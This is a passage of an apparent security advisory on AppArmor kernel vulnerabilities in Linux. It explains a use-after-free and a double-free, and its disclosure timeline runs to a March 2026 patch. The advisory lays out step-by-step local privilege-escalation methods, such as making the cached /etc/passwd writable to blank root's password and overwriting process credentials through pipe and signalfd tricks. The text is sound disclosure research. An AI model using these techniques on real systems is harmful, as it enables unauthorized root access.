+e. 8e. ff. ff. 00. 00. 00. 00. 00. 00. 00. 00. c0. 89. 83.=20
+03a0: 80. 1e. 8e. ff. ff. 01. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 0=
+0. 00. 00. 80. ff. ff. ff. ff. ff. ff. ff. 7f. 00. 00. 00.=20
+03c0: 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 74t 6dm 70p 66f 7=
+3s 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00.=20
+03e0: 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 00. 5c\ fd. 6dm 46F a=
+2. 1e. 42B 5f_ b3. b6. 300 db. 1a. dd. dc. fe. 00. 00. 00.=20
+0400: 00.=20
+0401.
+------------------------------------------------------------------------
+
+
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+A use-after-free
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+
+    The empty page is ripped
+    The empty page has slipped
+        -- Sonic Youth, "The Empty Page"
+
+The third kernel vulnerability that we discovered in AppArmor's code is
+a use-after-free. When we load a new profile (by write()ing its binary
+form to AppArmor's .load file), AppArmor records this raw, binary
+profile (in a compressed form), plus meta-data, in an aa_loaddata
+structure, allocated in the kernel's kmalloc-192 slab cache:
+
+------------------------------------------------------------------------
+ 99 struct aa_loaddata {
+100         struct kref count;
+101         struct list_head list;
+102         struct work_struct work;
+103         struct dentry *dents[AAFS_LOADDATA_NDENTS];
+104         struct aa_ns *ns;
+105         char *name;
+106         size_t size;                    /* the original size of the pay=
+load */
+107         size_t compressed_size;         /* the compressed size of the p=
+ayload */
+108         long revision;                  /* the ns policy revision this =
+caused */
+109         int abi;
+110         unsigned char *hash;
+...
+116         char *data;
+117 };
+------------------------------------------------------------------------
+
+Various members of this aa_loaddata structure are readable through
+directory entries (dentries) in AppArmor's filesystem; for example, if
+we cat the compressed_size file, the open() syscall acquires a reference
+to this file's dentry, which contains a pointer (d_inode) to its inode,
+which contains a pointer (i_private) to its aa_loaddata structure:
+
+------------------------------------------------------------------------
+$ strace cat /sys/kernel/security/apparmor/policy/raw_data/0/compressed_size
+...
+openat(AT_FDCWD, "/sys/kernel/security/apparmor/policy/raw_data/0/compresse=
+d_size", O_RDONLY) =3D 3
+...
+read(3, "408\n", 131072)                =3D 4
+...
+------------------------------------------------------------------------
+1423 SYSCALL_DEFINE3(open, const char __user *, filename, int, flags, umode=
+_t, mode)
+....
+1427         return do_sys_open(AT_FDCWD, filename, flags, mode);
+------------------------------------------------------------------------
+1416 long do_sys_open(int dfd, const char __user *filename, int flags, umod=
+e_t mode)
+....
+1419         return do_sys_openat2(dfd, filename, &how);
+------------------------------------------------------------------------
+1388 static long do_sys_openat2(int dfd, const char __user *filename,
+....
+1404                 struct file *f =3D do_filp_open(dfd, tmp, &op);
+------------------------------------------------------------------------
+3821 struct file *do_filp_open(int dfd, struct filename *pathname,
+....
+3829         filp =3D path_openat(&nd, op, flags | LOOKUP_RCU);
+------------------------------------------------------------------------
+3782 static struct file *path_openat(struct nameidata *nd,
+....
+3802                         error =3D do_open(nd, file, op);
+------------------------------------------------------------------------
+3601 static int do_open(struct nameidata *nd,
+....
+3645                 error =3D vfs_open(&nd->path, file);
+------------------------------------------------------------------------
+1084 int vfs_open(const struct path *path, struct file *file)
+....
+1087         return do_dentry_open(file, d_backing_inode(path->dentry), NUL=
+L);
+------------------------------------------------------------------------
+ 902 static int do_dentry_open(struct file *f,
+ ...
+ 940         error =3D security_file_open(f);
+ ...
+ 951                 open =3D f->f_op->open;
+ ...
+ 953                 error =3D open(inode, f);
+------------------------------------------------------------------------
+1240 static int seq_rawdata_open(struct inode *inode, struct file *file,
+....
+1243         struct aa_loaddata *data =3D __aa_get_loaddata(inode->i_privat=
+e);
+....
+1246         if (!data)
+1247                 /* lost race this ent is being reaped */
+1248                 return -ENOENT;
+------------------------------------------------------------------------
+1302 static int seq_rawdata_compressed_size_show(struct seq_file *seq, void=
+ *v)
+....
+1304         struct aa_loaddata *data =3D seq->private;
+....
+1306         seq_printf(seq, "%zu\n", data->compressed_size);
+------------------------------------------------------------------------
+
+While auditing AppArmor's code, we spotted several puzzling comments:
+"no refcount on inode rawdata", "no refcounts on i_private" -- although
+the aa_loaddata structure is referenced by its dentries (via the d_inode
+and i_private pointers), these references are not added to aa_loaddata's
+count member; in other words, they are not reference-counted.
+
+We tried to understand why this is secure, but soon realized that these
+references to the aa_loaddata structure should, in fact, be counted: if,
+
+- after open() acquires a reference to the compressed_size file's dentry
+  (in path_openat(), before the call to do_open() at line 3802),
+
+- but before open() calls the compressed_size file's seq_rawdata_open()
+  (in do_dentry_open(), at line 953),
+
+if a racing, concurrent thread drops the very last reference to the
+aa_loaddata structure (by removing the corresponding AppArmor profile)
+and therefore kfree()s it, then when seq_rawdata_open() is called, the
+aa_loaddata structure is already kfree()d, and used-after-free at line
+1243, and potentially also at line 1306.
+
+Initially, we thought that we would never be able to win this race
+condition (between line 3802 and line 953), for three reasons:
+
+1/ When the last reference to the aa_loaddata structure is dropped (when
+its count member drops to zero), this aa_loaddata structure is not
+immediately kfree()d, but scheduled for a delayed kfree():
+
+------------------------------------------------------------------------
+162 static inline void aa_put_loaddata(struct aa_loaddata *data)
+...
+165                 kref_put(&data->count, aa_loaddata_kref);
+------------------------------------------------------------------------
+ 133 void aa_loaddata_kref(struct kref *kref)
+ ...
+ 135         struct aa_loaddata *d =3D container_of(kref, struct aa_loaddat=
+a, count);
+ ...
+ 138                 INIT_WORK(&d->work, do_loaddata_free);
+ 139                 schedule_work(&d->work);
+------------------------------------------------------------------------
+ 115 static void do_loaddata_free(struct work_struct *work)
+ ...
+ 117         struct aa_loaddata *d =3D container_of(work, struct aa_loaddat=
+a, work);
+ ...
+ 130         kfree_sensitive(d);
+------------------------------------------------------------------------
+
+As a result, the aa_loaddata structure might not be kfree()d yet when
+seq_rawdata_open() is called, thus preventing it from being
+used-after-free.
+
+2/ In any case, simply calling seq_rawdata_open() with a recently
+kfree()d aa_loaddata structure is not enough, because do_loaddata_free()
+actually calls kfree_sensitive(), which first memset()s this aa_loaddata
+structure to zero and causes seq_rawdata_open() to return immediately at
+line 1248 (because the count member of this already kfree()d aa_loaddata
+structure is zero), without an exploitable use-after-free:
+
+------------------------------------------------------------------------
+132 __aa_get_loaddata(struct aa_loaddata *data)
+...
+134         if (data && kref_get_unless_zero(&(data->count)))
+135                 return data;
+...
+137         return NULL;
+------------------------------------------------------------------------
+ 94  * kref_get_unless_zero - Increment refcount for object unless it is ze=
+ro.
+ ..
+ 97  * Return non-zero if the increment succeeded. Otherwise return 0.
+...
+109 static inline int __must_check kref_get_unless_zero(struct kref *kref)
+...
+111         return refcount_inc_not_zero(&kref->refcount);
+------------------------------------------------------------------------
+
+Consequently, we must not only kfree() the aa_loaddata structure during
+the race-condition window, but we must also re-allocate its memory with
+another useful object whose first four bytes (the count member of this
+already kfree()d aa_loaddata structure) are not all zeros.
+
+3/ This race-condition window (between line 3802 and line 953) seemed
+very narrow; in particular, it does not seem to contain any user-space
+access that could be blocked with FUSE for example.
+
+Fortunately, we have an ace up our sleeve: in the middle of the
+race-condition window, open() calls security_file_open() (at line 940),
+which calls apparmor_file_open(); and because we have the ability to
+load new arbitrary AppArmor profiles, we can load specially crafted
+profiles that slow down security_file_open(), and therefore greatly
+widen the race-condition window and allow us to easily win this race
+condition. We developed two alternative methods, each with its own
+advantages and disadvantages:
+
+a/ Triggered by the earlier out-of-bounds memory read in aa_dfa_match(),
+we slow down security_file_open(), and hence the thread that open()s the
+compressed_size file, by confining it with an AppArmor profile whose DFA
+reads megabytes or even gigabytes of out-of-bounds memory, which takes
+several seconds and gives us plenty of time to reliably win the race
+condition in open(). Disadvantages:
+
+- this method requires an AppArmor and unprivileged user namespace,
+  which would not be otherwise required to exploit this use-after-free:
+  because our DFA is rather large (it has ~64K states), we must write()
+  the corresponding profile directly to AppArmor's .load file, because
+  (to the best of our knowledge) write()s via su's stdout in pty mode
+  are limited to 4KB;
+
+- occasionally, this out-of-bounds read of megabytes or gigabytes of
+  kernel memory causes an Oops (because of a "not-present page"), but on
+  Ubuntu and Debian at least such an Oops does not cause a system crash:
+  we can simply re-run our exploit with a slightly different DFA.
+
+b/ Alternatively, to slow down the thread that open()s the
+compressed_size file, we confine it with thousands of stacked AppArmor
+profiles ("myprofile1//&myprofile2//&myprofile3//&etc" for example), and
+specify a ~4KB attach_disconnected.path for each one of these profiles:
+apparmor_file_open() is forced to read millions of bytes (the number of
+stacked profiles multiplied by the length of attach_disconnected.path),
+which takes hundreds of milliseconds and gives us enough time to
+reliably win the race condition in open(). Disadvantage:
+
+- thousands of stacked AppArmor profiles consume a large amount of
+  memory, which can be a problem on small systems.
+
+We succeeded in reliably winning this race condition, but how do we
+exploit the resulting use-after-free? Our initial strategy failed (we
+were planning to re-allocate the kfree()d aa_loaddata structure with a
+temporary extended-attribute (xattr) or user-key buffer), because we
+completely overlooked the fact that the CONFIG_RANDOM_KMALLOC_CACHES
+mitigation is enabled by default in Ubuntu 24.04.3:
+
+with a high probability (15/16), useful objects such as xattr or
+user-key buffers are never allocated in the same slab cache as our
+kfree()d aa_loaddata structure (which is allocated in one of the
+"kmalloc-(|rnd-..-)192" slab caches). For more information on the
+CONFIG_RANDOM_KMALLOC_CACHES mitigation:
+
+  https://sam4k.com/exploring-linux-random-kmalloc-caches/
+  (by Sam Page)
+
+  https://dustri.org/b/some-notes-on-randomized-slab-caches-for-kmalloc.html
+  (by Julien Voisin)
+
+Sadly, and as highlighted repeatedly by various researchers, the
+CONFIG_RANDOM_KMALLOC_CACHES mitigation does not protect at all against
+cross-cache attacks:
+
+  https://x.com/andreyknvl/status/1700267669336080678
+  (by Andrey Konovalov)
+
+  https://infosec.exchange/@minipli/111045336853055793
+  (by Mathias Krause)
+
+  https://a13xp0p0v.github.io/2025/09/02/kernel-hack-drill-and-CVE-2024-502=
+64.html
+  (by Alexander Popov)
+
+We therefore decided to exploit the use-after-free of the aa_loaddata
+structure by simply "Freeing the object's page to the page allocator"
+and "Reallocating the victim page as a pagetable", from Jann Horn's
+beautifully elegant attack against CVE-2020-29661:
+
+  https://projectzero.google/2021/10/how-simple-linux-kernel-memory.html
+
+In a nutshell:
+
+- we perform the cross-cache dance from "Freeing the object's page to
+  the page allocator", and give the page of memory (where our kfree()d
+  aa_loaddata structure was allocated) back to the page allocator (note:
+  to allocate and free the numerous objects required by this first stage
+  of the attack, we load and remove numerous minimal AppArmor profiles,
+  whose aa_loaddata structures are guaranteed to be allocated in the
+  same random slab cache as our kfree()d aa_loaddata structure);
+
+- we carry out the second stage of the attack, from "Reallocating the
+  victim page as a pagetable", and re-allocate the page of memory (where
+  our kfree()d aa_loaddata structure was allocated) as a page table (PT)
+  whose page-table entries (PTEs) all correspond to the first mmap()ed
+  page of /etc/passwd (in read-only mode, since we do not have write
+  access to this file);
+
+- we verify that the first two stages of the attack succeeded, by
+  read()ing the compressed_size member of our kfree()d aa_loaddata
+  structure (through our file descriptor to the compressed_size file,
+  which we open()ed during the race condition): if it looks like a PTE
+  (a read-only PTE), then we successfully re-allocated the page where
+  our kfree()d aa_loaddata structure was allocated, and its count and
+  compressed_size members are now PTEs for /etc/passwd;
+
+  (note: in the unlikely event that the 31st bit of this PTE is set
+  (i.e., the count member of our kfree()d aa_loaddata structure becomes
+  negative, "saturated"), our exploit fails, but the kernel only issues
+  a warning, and we can simply re-run our exploit with a target file
+  other than /etc/passwd)
+
+- we add 0x42 references to the count member of our kfree()d aa_loaddata
+  structure, by open()ing our /proc/pid/fd/n to the compressed_size file
+  (0x42 times), thus turning on the _PAGE_DIRTY bit (0x40) and _PAGE_RW
+  bit (0x2) of the PTE that corresponds to this count member: one of our
+  mmap()ed pages of /etc/passwd is now writable;
+
+- we write (more exactly, we pread()) to this writable mmap()ed page of
+  /etc/passwd (which is the page-cached, in-memory copy of /etc/passwd,
+  not the original, on-disk /etc/passwd), and overwrite its first line
+  ("root:x:0:0:root:/root:/bin/bash\n") with a passwordless first line
+  ("root::0:0:root:/root:/bin/bash\n");
+
+- we drop 0x42 references from the count member of our kfree()d
+  aa_loaddata structure, by close()ing our 0x42 file descriptors to the
+  compressed_size file, thus turning off the _PAGE_DIRTY and _PAGE_RW
+  bits of the PTE that corresponds to this count member (i.e., we
+  restore this PTE to its original, read-only value);
+
+- we execute su and instantly obtain a root shell with full privileges,
+  thanks to our passwordless first line in /etc/passwd.
+
+On Ubuntu 24.04.3, this exploit is extremely reliable (most likely
+because the CONFIG_RANDOM_KMALLOC_CACHES mitigation greatly reduces the
+slab-cache noise); on Debian 13.1, a few re-runs of the exploit may be
+needed (the CONFIG_RANDOM_KMALLOC_CACHES mitigation is not enabled by
+default in Debian 13.1).
+
+
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+A double-free
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+
+    We paint a zero on his hand
+        -- Sonic Youth, "Teen Age Riot"
+
+The fourth kernel vulnerability that we discovered in AppArmor's code is
+a double-free. We decided to exploit this vulnerability on Debian 13.1;
+Ubuntu 24.04.3 is probably also exploitable, but requires a different
+exploitation strategy because of the CONFIG_RANDOM_KMALLOC_CACHES
+mitigation (indeed, we do not perform a cross-cache attack in our
+exploit against Debian 13.1).
+
+In aa_replace_profiles() (which parses the profiles that we write() to
+AppArmor's .load and .replace files), if no profile explicitly specifies
+a namespace in its header (i.e., ns_name is still NULL after line 1071),
+but if one profile implicitly specifies a namespace in its profile name,
+for example ":mynamespace:myprofile" (i.e., ent->ns_name is not NULL, at
+line 1089), then ns_name is set to this ent->ns_name (at line 1095), and
+kfree()d a first time (at line 1262) and kfree()d a second time (at line
+1270): a double-free vulnerability, in any slab cache between kmalloc-8
+and kmalloc-256 (because the length of an AppArmor namespace can be
+anywhere between 1 and 255 bytes (NAME_MAX)).
+
+------------------------------------------------------------------------
+1057 ssize_t aa_replace_profiles(struct aa_ns *policy_ns, struct aa_label *=
+label,
+....
+1060         const char *ns_name =3D NULL, *info =3D NULL;
+....
+1071         error =3D aa_unpack(udata, &lh, &ns_name);
+....
+1082                 if (ns_name) {
+....
+1089                 } else if (ent->ns_name) {
+....
+1095                         ns_name =3D ent->ns_name;
+....
+1246                 if (ent->old) {
+....
+1248                         __replace_profile(ent->old, ent->new);
+....
+1262                 aa_load_ent_free(ent);
+....
+1270         kfree(ns_name);
+------------------------------------------------------------------------
+1273 void aa_load_ent_free(struct aa_load_ent *ent)
+....
+1279                 kfree(ent->ns_name);
+------------------------------------------------------------------------
+
+To successfully exploit this double-free (and to avoid a system crash),
+we must re-allocate ns_name's memory after the first kfree() (line 1262)
+but before the second kfree() (line 1270). Initially, we thought that we
+would not be able to win this race condition, but we eventually realized
+that if we write() numerous concatenated profiles to AppArmor's .replace
+file and if these profiles contain subprofiles, then __replace_profile()
+is called numerous times (at line 1248) and each call loops over each of
+these subprofiles (at lines 949-967), which takes considerable time. For
+example, 1024 profiles that contain 16 subprofiles each widen the race-
+condition window to several seconds and allow us to reliably win this
+race condition.
+
+------------------------------------------------------------------------
+ 941 static void __replace_profile(struct aa_profile *old, struct aa_profil=
+e *new)
+ ...
+ 947                 list_splice_init_rcu(&old->base.profiles, &lh, synchro=
+nize_rcu);
+ ...
+ 949                 list_for_each_entry_safe(child, tmp, &lh, base.list) {
+ ...
+ 964                         rcu_assign_pointer(child->parent, aa_get_profi=
+le(new));
+ 965                         list_add_rcu(&child->base.list, &new->base.pro=
+files);
+ ...
+ 967                 }
+------------------------------------------------------------------------
+
+But how do we exploit the resulting double-free? Our initial strategy
+failed miserably: we were planning to re-allocate ns_name's memory with
+a temporary xattr buffer, but completely overlooked the fact that these
+allocations "Use dedicated slab buckets for memdup_user()", because the
+CONFIG_SLAB_BUCKETS mitigation is enabled by default in Debian 13.1. We
+therefore decided to simply allocate another object instead (a temporary
+user-key buffer), and closely followed the Crusaders of Rust's TL;DR for
+their extremely impressive attack against CVE-2025-38001:
+
+  https://syst3mfailure.io/rbtree-family-drama/
+
+In a nutshell:
+
+- immediately after the first kfree() of ns_name, we re-allocate its
+  memory with a temporary user-key buffer (via the add_key() syscall or
+  the keyctl(KEYCTL_UPDATE) syscall), but we block the copy of the last
+  bytes of this user-key buffer (from user space to kernel space) with
+  FUSE (it would otherwise be kfree()d automatically);
+
+- immediately after the second kfree() of ns_name, which actually
+  kfree()s our user-key buffer (whose copy is still blocked by FUSE), we
+  re-allocate and therefore overwrite its memory with an AF_PACKET page
+  vector (an array of pointers to single-page buffers in kernel space)
+  -- in reality, we allocate numerous AF_PACKET page vectors (via the
+  setsockopt(PACKET_TX_RING) syscall), for a reason that will become
+  clear below;
+
+- we unblock the copy of our user-key buffer (which was still blocked by
+  FUSE, and was mostly overwritten by our AF_PACKET page vector), and we
+  read back this user-key buffer (via the keyctl(KEYCTL_READ) syscall),
+  thereby disclosing the pointers from our AF_PACKET page vector -- this
+  is essentially the clever "One Weird Trick" from Valentina Palmiotti's
+  exploit for CVE-2021-41073 (but with a user-key instead of an xattr):
+
+  https://chomp.ie/Blog+Posts/Put+an+io_uring+on+it+-+Exploiting+the+Linux+=
+Kernel
+
+- since the unblocking above automatically kfree()d our user-key buffer,
+  and hence our AF_PACKET page vector, we immediately re-allocate and
+  therefore overwrite its memory with another temporary user-key buffer
+  (whose copy from user space to kernel space is also blocked by FUSE):
+  an identical copy of our originally disclosed AF_PACKET page vector,
+  except for its very first pointer, which we overwrite with a slightly
+  higher pointer than the highest pointer of this AF_PACKET page vector
+  -- with high probability, this overwritten pointer is equal to one of
+  the pointers from one of our *other* numerous AF_PACKET page vectors;
+
+- as a result, the page of memory that corresponds to this overwritten
+  pointer is artificially referenced twice, in two different AF_PACKET
+  page vectors (but one of these two references is uncounted, and will
+  lead to a use-after-free): if we mmap() all of the pages from all of
+  our AF_PACKET page vectors (through their AF_PACKET file descriptors),
+  and if we write a unique tag to each one of these mmap()ed pages, then
+  we can detect the page that is referenced twice (and mmap()ed twice);
+
+- we munmap() this page (twice) and close() the first of the two
+  AF_PACKET file descriptors that reference this page, which drops its
+  reference count to zero and gives it back to the page allocator (but
+  we still have an uncounted reference to this free page, through the
+  second of the two aforementioned AF_PACKET file descriptors);
+
+- we immediately re-allocate this free page as a pipe buffer (by
+  write()ing to a pipe whose buffer was set to a single page via the
+  fcntl(F_SETPIPE_SZ) syscall), then free it again (by close()ing the
+  second and last AF_PACKET file descriptor that still references it),
+  and immediately re-allocate it again as a page full of file structures
+  (via numerous signalfd(-1) syscalls), thus gaining arbitrary read and
+  write access from and to this page (and all of the file structures it
+  contains) via read()s and write()s from and to our pipe;
+
+- we read() the contents of this page (and all of its file structures)
+  from our pipe, which discloses f_cred, a pointer to our process's cred
+  structure (credentials such as uid, euid, gid, etc), and private_data,
+  a pointer to a signalfd_ctx structure (one unsigned long, sigmask);
+
+- we overwrite the private_data pointer with the f_cred pointer, by
+  write()ing a modified version of this page (and its file structures)
+  to our pipe, and call signalfd() to write zeros (the most significant
+  bytes of a sigmask) to private_data (which we overwrote with f_cred),
+  thus overwriting the uid credentials of our process with zeros: at
+  long last, our process is now running as the root user.
+
+Note: because this exploitation strategy uses AF_PACKET page vectors, it
+requires a network namespace (and hence an unprivileged user namespace);
+however, it should be possible to develop another exploitation strategy
+that does not require a user namespace, but this is left as an exercise
+for the interested reader.
+
+
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+Acknowledgments
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+
+We thank Ubuntu's security team and Canonical's AppArmor developers
+(John Johansen, Georgia Garcia, Maxime Belair, Massimiliano Pellizzer,
+and Cengiz Can, in particular) for their hard work on this release. We
+also thank Sudo's maintainer (Todd C. Miller), Debian's security team
+(Salvatore Bonaccorso in particular), SUSE's security team (Matthias
+Gerstner and Marcus Meissner in particular), the Linux kernel security
+team (Greg Kroah-Hartman and Willy Tarreau in particular), and the
+members of the linux-distros mailing list.
+
+None of this research would have been possible without the public work
+of Jann Horn and the Crusaders of Rust. And more generally, we sincerely
+thank all the security researchers who continue to publish their work;
+they make a world of difference.
+
+We also thank the Phrack staff, old and new, for keeping the spirit and
+the scene alive, and Gerardo Richarte for his kind words about our work:
+
+  https://phrack.org/issues/72/2
+
+Finally, we dedicate this advisory to Sebastian Krahmer:
+
+  https://www.thc.org/404/stealth/eulogy.txt
+
+
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+Timeline
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+
+2025-07-10: Sent a first batch of vulnerabilities to Ubuntu's security
+team and Canonical's AppArmor developers.
+
+2025-08-01: Sent a second batch of vulnerabilities to Ubuntu's security
+team and Canonical's AppArmor developers.
+
+2025-09-09: Sent a third batch of vulnerabilities to Ubuntu's security
+team and Canonical's AppArmor developers.
+
+2025-10-20: Sent a draft of our advisory to Ubuntu's security team and
+Canonical's AppArmor developers.
+
+2025-12-15: Sent a mail to Ubuntu's security team and Canonical's
+AppArmor developers to share our worries about the state of this
+vulnerability disclosure.
+
+2026-01-14: Sent another mail to Ubuntu's security team and Canonical's
+AppArmor developers to share our worries about the state of this
+vulnerability disclosure.
+
+2026-02-11: Together with Canonical's AppArmor developers, fixed the
+Coordinated Release Date to 2026-03-03.
+
+2026-02-17: Contacted Sudo's maintainer.
+
+2026-02-17: Received a first version of the patches from Canonical's
+AppArmor developers.
+
+2026-02-18: Contacted Debian's security team and SUSE's security team.
+
+2026-02-19: Sent a first review of the patches to Ubuntu's security team
+and Canonical's AppArmor developers.
+
+2026-02-20: Sent the first version of the patches to Debian's security
+team and SUSE's security team.
+
+2026-02-24: Contacted the Linux kernel security team (security@kernel).
+
+2026-02-26: Received a second version of the patches from Canonical's
+AppArmor developers.
+
+2026-02-26: Sent the second version of the patches and a draft of our
+advisory to the linux-distros mailing list (linux-distros@openwall).
+
+2026-02-27: Sent a second review of the patches to Ubuntu's security
+team and Canonical's AppArmor developers.
+
+2026-02-28: Contacted the Linux kernel CVE assignment team (cve@kernel).
+
+2026-03-03: Together with Canonical's AppArmor developers, postponed the
+Coordinated Release Date (one of the patches was incomplete), until "the
+patches are published upstream in Linus's tree".
+
+2026-03-03: Received a third version of the patches from Canonical's
+AppArmor developers.
+
+2026-03-04: Sent a third review of the patches to Canonical's AppArmor
+developers.
+
+2026-03-05: Received a fourth version of the patches from Canonical's
+AppArmor developers.
+
+2026-03-09: Received a fifth and final version of the patches from
+Canonical's AppArmor developers.
+
+2026-03-12: The patches are published upstream in Linus's tree.
